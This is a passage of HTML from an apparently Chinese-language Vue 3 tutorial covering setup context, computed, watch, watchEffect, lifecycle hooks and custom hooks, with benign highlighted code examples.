class="string">&quot;@/components/Demo.vue&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">name</span>: <span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Demo</span></span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">setup</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">showHelloMsg</span>(<span class="params">val</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">alert</span>(<span class="string">`你好哇，你出发了hello事件，我收到的参数是：<span class="subst">$&#123;val&#125;</span>`</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      showHelloMsg</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--------子组件---------&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>姓名：&#123;&#123;person.name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>年龄：&#123;&#123;person.age&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;test&quot;</span>&gt;</span>测试触发事件<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> &#123;reactive&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">name</span>: <span class="string">&quot;Demo&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">props</span>: [<span class="string">&#x27;msg&#x27;</span>, <span class="string">&#x27;school&#x27;</span>],</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">emits</span>: [<span class="string">&#x27;hello&#x27;</span>],</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">setup</span>(<span class="params">props, context</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// console.log(&#x27;---props---&#x27;, props)</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// console.log(&#x27;---context---&#x27;, context.attrs) // 相当于vue2中的$attrs</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// console.log(&#x27;---context---&#x27;, context.emit) // 触发自定义事件</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;---context---&#x27;</span>, context.<span class="property">slots</span>) <span class="comment">// 相当于vue2中的$attrs</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 数据</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> person = <span class="title function_">reactive</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">age</span>: <span class="number">18</span></span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 方法</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      context.<span class="title function_">emit</span>(<span class="string">&#x27;hello&#x27;</span>, <span class="number">666</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      person,</span></span><br><span class="line"><span class="language-javascript">      test</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><h2 id="计算属性与监视"><a href="#计算属性与监视" class="headerlink" title="计算属性与监视"></a>计算属性与监视</h2><h3 id="computed函数"><a href="#computed函数" class="headerlink" title="computed函数"></a>computed函数</h3><ul><li><p>与Vue2.x中computed配置功能一致</p></li><li><p>写法</p></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  姓：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;person.firstName&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;person.lastName&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span>&gt;</span>全名：&#123;&#123; fullName &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span>&gt;</span>全名：&#123;&#123; person.fullName &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  全名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;person.fullName&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> &#123;reactive, computed&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">name</span>: <span class="string">&#x27;DEMO&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">computed</span>: &#123; <span class="comment">// vue2,计算属性的值是一个对象</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fullName</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">person</span>.<span class="property">firstName</span> + <span class="string">&#x27;-&#x27;</span> + <span class="variable language_">this</span>.<span class="property">person</span>.<span class="property">lastName</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">setup</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 数据</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> person = <span class="title function_">reactive</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">firstName</span>: <span class="string">&#x27;张&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">lastName</span>: <span class="string">&#x27;三&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// vue3计算属性-简写（没有考虑计算属性被修改的情况）</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 箭头函数</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> fullName1 = <span class="title function_">computed</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> person.<span class="property">firstName</span> + <span class="string">&#x27;-&#x27;</span> + person.<span class="property">lastName</span></span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 普通函数</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> fullName1 = <span class="title function_">computed</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> person.<span class="property">firstName</span> + <span class="string">&#x27;-&#x27;</span> + person.<span class="property">lastName</span></span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// vue3计算属性-完成写法（考虑读和写）</span></span></span><br><span class="line"><span class="language-javascript">    person.<span class="property">fullName</span> = <span class="title function_">computed</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">get</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> person.<span class="property">firstName</span> + <span class="string">&#x27;-&#x27;</span> + person.<span class="property">lastName</span></span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">set</span>(<span class="params">value</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> nameArr = value.<span class="title function_">split</span>(<span class="string">&#x27;-&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        person.<span class="property">firstName</span> = nameArr[<span class="number">0</span>]</span></span><br><span class="line"><span class="language-javascript">        person.<span class="property">lastName</span> = nameArr[<span class="number">1</span>]</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 返回一个对象（常用）</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      person</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="watch函数"><a href="#watch函数" class="headerlink" title="watch函数"></a>watch函数</h3><ul><li><p>与Vue2.x中watch配置功能一致</p></li><li><p>参数：</p><ul><li>第一个参数：监视谁，单个字段或多个（数组）</li><li>第二个参数：监视的回调</li><li>第三个参数：监视的配置对象</li></ul></li><li><p>两个小“坑”：</p><ul><li>监视reactive定义的响应式数据时：oldValue无法正确获取、强制开启了深度监视（deep配置失效）。</li><li>监视reactive定义的响应式数据中某个属性（属性是对象）时：deep配置有效。</li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;ref, reactive, watch&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;DEMO&#x27;</span>,</span><br><span class="line">    <span class="attr">watch</span>: &#123; <span class="comment">// vue2中监听</span></span><br><span class="line">        <span class="comment">// 简单写，函数</span></span><br><span class="line">        <span class="title function_">sum</span>(<span class="params">newValue, oldValue</span>)&#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;sum的值变化了&#x27;</span>, newValue, oldValue)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">// 完整写，对象</span></span><br><span class="line">        <span class="attr">sum</span>: &#123;</span><br><span class="line">          <span class="attr">immediate</span>: <span class="literal">true</span>, <span class="comment">// 立即监听</span></span><br><span class="line">          <span class="attr">deep</span>: <span class="literal">true</span>, <span class="comment">// 深度监听</span></span><br><span class="line">          <span class="title function_">handler</span>(<span class="params">newValue, oldValue</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;sum的值变化了&#x27;</span>, newValue, oldValue)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">setup</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// 数据</span></span><br><span class="line">        <span class="keyword">let</span> sum = <span class="title function_">ref</span>(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">let</span> msg = <span class="title function_">ref</span>(<span class="string">&#x27;你好哇&#x27;</span>)</span><br><span class="line">        <span class="keyword">let</span> person = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">            <span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line">            <span class="attr">job</span>: &#123;</span><br><span class="line">                <span class="attr">j1</span>:&#123;</span><br><span class="line">                    <span class="attr">salary</span>: <span class="number">20</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment">//情况一：监视ref定义的一个响应式数据</span></span><br><span class="line">        <span class="title function_">watch</span>(sum,<span class="function">(<span class="params">newValue,oldValue</span>)=&gt;</span>&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;sum变化了&#x27;</span>,newValue,oldValue)</span><br><span class="line">        &#125;,&#123;<span class="attr">immediate</span>:<span class="literal">true</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="title function_">watch</span>(msg, <span class="function">(<span class="params">newValue, oldValue</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;msg的值变化了&#x27;</span>, newValue, oldValue)</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 情况二：监视ref定义的多个响应式数据</span></span><br><span class="line"><span class="comment">        *   如果immediate为true, 第一次监听结果oldValue为空数组</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        <span class="title function_">watch</span>([sum,msg],<span class="function">(<span class="params">newValue,oldValue</span>)=&gt;</span>&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;sum或msg变化了&#x27;</span>,newValue,oldValue)</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 情况三：监视reactive定义的一个响应式对象数据</span></span><br><span class="line"><span class="comment">        *   1、注意：若watch监视的是reactive定义的响应式数据，则无法正确获得oldValue！！（与newValue一样）</span></span><br><span class="line"><span class="comment">        *   2、注意：若watch监视的是reactive定义的响应式数据，则强制开启了深度监视（deep配置无效）</span></span><br><span class="line"><span class="comment">        *   3、如果特别需要oldValue，可以将对象中的值赋予ref定义的新值，再对新值监听</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="title function_">watch</span>(person,<span class="function">(<span class="params">newValue,oldValue</span>)=&gt;</span>&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;person变化了&#x27;</span>,newValue,oldValue)</span><br><span class="line">        &#125;,&#123;<span class="attr">immediate</span>:<span class="literal">true</span>,<span class="attr">deep</span>:<span class="literal">false</span>&#125;) <span class="comment">//此处的deep配置不再奏效</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 情况四：监视reactive定义的一个响应式对象中的某个属性</span></span><br><span class="line"><span class="comment">        *   仍然无法获取oldValue正确值</span></span><br><span class="line"><span class="comment">        *   未开启深度监视（deep配置有效）</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        <span class="title function_">watch</span>(<span class="function">()=&gt;</span>person.<span class="property">job</span>,<span class="function">(<span class="params">newValue,oldValue</span>)=&gt;</span>&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;person的job变化了&#x27;</span>,newValue,oldValue)</span><br><span class="line">        &#125;,&#123;<span class="attr">immediate</span>:<span class="literal">true</span>,<span class="attr">deep</span>:<span class="literal">true</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 情况五：监视reactive定义的响应式数据中的某些属性</span></span><br><span class="line"><span class="comment">        *   person.mame发生变化时，oldValue可以获取正确值；而person.job发生变化时，不能获取oldValue的正确值</span></span><br><span class="line"><span class="comment">        *   deep为false时，person.mame发生变化时可以监听到，但是person.job发生变化时不可以监听到数据变化</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        <span class="title function_">watch</span>([<span class="function">()=&gt;</span>person.<span class="property">job</span>,<span class="function">()=&gt;</span>person.<span class="property">name</span>],<span class="function">(<span class="params">newValue,oldValue</span>)=&gt;</span>&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;person的job变化了&#x27;</span>,newValue,oldValue)</span><br><span class="line">        &#125;,&#123;<span class="attr">immediate</span>:<span class="literal">true</span>,<span class="attr">deep</span>:<span class="literal">true</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 特殊情况</span></span><br><span class="line"><span class="comment">        *   此处由于监视的是reactive素定义的对象中的某个属性，所以deep配置有效</span></span><br><span class="line"><span class="comment">        *  */</span></span><br><span class="line">        <span class="title function_">watch</span>(<span class="function">()=&gt;</span>person.<span class="property">job</span>,<span class="function">(<span class="params">newValue,oldValue</span>)=&gt;</span>&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;person的job变化了&#x27;</span>,newValue,oldValue)</span><br><span class="line">        &#125;,&#123;<span class="attr">deep</span>:<span class="literal">true</span>&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如何监听ref定义对象数据</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 数据</span></span><br><span class="line"><span class="keyword">let</span> sum = <span class="title function_">ref</span>(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">let</span> person = <span class="title function_">ref</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line">    <span class="attr">job</span>: &#123;</span><br><span class="line">        <span class="attr">j1</span>:&#123;</span><br><span class="line">            <span class="attr">salary</span>: <span class="number">20</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 报错，</span></span><br><span class="line"><span class="comment">// 如果使用sum.value，因为sum.value等于0，相等于监听0</span></span><br><span class="line"><span class="comment">// 如果使用sum，则监视的是RefImpl实例对象</span></span><br><span class="line"><span class="title function_">watch</span>(sum.<span class="property">value</span>,<span class="function">(<span class="params">newValue,oldValue</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;person变化了&#x27;</span>,newValue,oldValue)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// person.value是ref借助reactive函数生成的Proxy实例对象，</span></span><br><span class="line"><span class="comment">// 相当于监听的是reactive所定义的数据（reactive定义的数据是自定开启深度监听）</span></span><br><span class="line"><span class="title function_">watch</span>(person.<span class="property">value</span>,<span class="function">(<span class="params">newValue,oldValue</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;person变化了&#x27;</span>,newValue,oldValue)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// person是RefImpl实例对象，加上deep:true,深度监听，可以监听RefImpl实例对象中value</span></span><br><span class="line"><span class="title function_">watch</span>(person,<span class="function">(<span class="params">newValue,oldValue</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;person变化了&#x27;</span>,newValue,oldValue)</span><br><span class="line">&#125;,&#123;<span class="attr">deep</span>:<span class="literal">true</span>&#125;)</span><br></pre></td></tr></table></figure><h3 id="watchEffect函数"><a href="#watchEffect函数" class="headerlink" title="watchEffect函数"></a>watchEffect函数</h3><ul><li><p>watch的套路是：既要指明监视的属性，也要指明监视的回调。</p></li><li><p>watchEffect的套路是：不用指明监视哪个属性，监视的回调中用到哪个属性，那就监视哪个属性。</p></li><li><p>watchEffect有点像computed：都是初始化的时候执行一次，所依赖的数据发生变化的时候</p><ul><li>但computed注重的计算出来的值（回调函数的返回值），所以必须要写返回值。</li><li>而watchEffect更注重的是过程（回调函数的函数体），所以不用写返回值。</li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 数据</span></span><br><span class="line"><span class="keyword">let</span> sum = <span class="title function_">ref</span>(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">let</span> person = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line">    <span class="attr">job</span>: &#123;</span><br><span class="line">        <span class="attr">j1</span>:&#123;</span><br><span class="line">            <span class="attr">salary</span>: <span class="number">20</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//watchEffect所指定的回调中用到的数据只要发生变化，则直接重新执行回调。</span></span><br><span class="line"><span class="comment">//相当于watch使用了immediate</span></span><br><span class="line"><span class="title function_">watchEffect</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> x1 = sum.<span class="property">value</span></span><br><span class="line">    <span class="keyword">const</span> x2 = person.<span class="property">age</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;watchEffect配置的回调执行了&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2><table><thead><tr><th>vue2.x的生命周期</th><th>vue3.0的生命周期</th></tr></thead><tbody><tr><td><img src="/images/vue2.x%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.jpg" alt="Image text"></td><td><img src="/images/vue3.0%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.jpg" alt="Image text"></td></tr></tbody></table><ul><li><p>Vue3.0中可以继续使用Vue2.x中的生命周期钩子，但有有两个被更名：</p><ul><li><code>beforeDestroy</code>改名为 <code>beforeUnmount</code></li><li><code>destroyed</code>改名为 <code>unmounted</code></li></ul></li><li><p>Vue3.0也提供了 Composition API 形式的生命周期钩子，与Vue2.x中钩子对应关系如下：</p><ul><li><code>beforeCreate</code>===&gt;<code>setup()</code></li><li><code>created</code>=======&gt;<code>setup()</code></li><li><code>beforeMount</code> ===&gt;<code>onBeforeMount</code></li><li><code>mounted</code>=======&gt;<code>onMounted</code></li><li><code>beforeUpdate</code>===&gt;<code>onBeforeUpdate</code></li><li><code>updated</code> =======&gt;<code>onUpdated</code></li><li><code>beforeUnmount</code>====&gt;<code>onBeforeUnmount</code></li><li><code>unmounted</code> =====&gt;<code>onUnmounted</code></li></ul></li><li><p>组合式API中的生命周期钩子比配置项中的同样作用的生命周期钩子先执行</p></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;ref,onBeforeMount,onMounted,onBeforeUpdate,onUpdated,onBeforeUnmount,onUnmounted&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;Demo&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="title function_">setup</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;---setup---&#x27;</span>)</span><br><span class="line">        <span class="comment">//数据</span></span><br><span class="line">        <span class="keyword">let</span> sum = <span class="title function_">ref</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过组合式API的形式去使用生命周期钩子</span></span><br><span class="line">        <span class="title function_">onBeforeMount</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;---onBeforeMount---&#x27;</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="title function_">onMounted</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;---onMounted---&#x27;</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="title function_">onBeforeUpdate</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;---onBeforeUpdate---&#x27;</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="title function_">onUpdated</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;---onUpdated---&#x27;</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="title function_">onBeforeUnmount</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;---onBeforeUnmount---&#x27;</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="title function_">onUnmounted</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;---onUnmounted---&#x27;</span>)</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment">//返回一个对象（常用）</span></span><br><span class="line">        <span class="keyword">return</span> &#123;sum&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//通过配置项的形式使用生命周期钩子</span></span><br><span class="line">    <span class="comment">//#region </span></span><br><span class="line">    <span class="comment">/*beforeCreate() &#123;</span></span><br><span class="line"><span class="comment">        console.log(&#x27;---beforeCreate---&#x27;)</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    created() &#123;</span></span><br><span class="line"><span class="comment">        console.log(&#x27;---created---&#x27;)</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    beforeMount() &#123;</span></span><br><span class="line"><span class="comment">        console.log(&#x27;---beforeMount---&#x27;)</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    mounted() &#123;</span></span><br><span class="line"><span class="comment">        console.log(&#x27;---mounted---&#x27;)</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    beforeUpdate()&#123;</span></span><br><span class="line"><span class="comment">        console.log(&#x27;---beforeUpdate---&#x27;)</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    updated() &#123;</span></span><br><span class="line"><span class="comment">        console.log(&#x27;---updated---&#x27;)</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    beforeUnmount() &#123;</span></span><br><span class="line"><span class="comment">        console.log(&#x27;---beforeUnmount---&#x27;)</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    unmounted() &#123;</span></span><br><span class="line"><span class="comment">        console.log(&#x27;---unmounted---&#x27;)</span></span><br><span class="line"><span class="comment">    &#125;,*/</span></span><br><span class="line">    <span class="comment">//#endregion</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="自定义hook函数"><a href="#自定义hook函数" class="headerlink" title="自定义hook函数"></a>自定义hook函数</h2><ul><li><p>什么是hook？—— 本质是一个函数，把setup函数中使用的Composition API进行了封装。</p></li><li><p>类似于vue2.x中的mixin。</p></li><li><p>自定义hook的优势: 复用代码, 让setup中的逻辑更清楚易懂。</p></li><li><p>hook文件名一般使用use开头</p></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义hook函数--文件usePoint.js</span></span><br><span class="line"><span class="keyword">import</span> &#123;reactive,onMounted,onBeforeUnmount&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line"><span class="comment">//实现鼠标“打点”相关的数据</span></span><br><span class="line"><span class="keyword">let</span> point = <span class="title 